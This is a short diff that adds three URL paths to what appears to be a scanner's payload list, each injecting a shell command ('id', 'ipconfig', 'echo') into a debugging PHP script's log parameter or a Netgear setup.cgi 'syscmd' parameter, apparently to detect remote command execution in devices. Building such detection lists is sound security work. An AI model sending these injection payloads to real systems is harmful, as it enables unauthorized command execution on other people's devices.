@@ -1,0 +1,3 @@
+/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20id
+/__debugging_center_utils___.php?log=;echo%20{{rand}}%20|%20ipconfig
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo%20{{randstr}}&curpath=/&currentsetting.htm=1
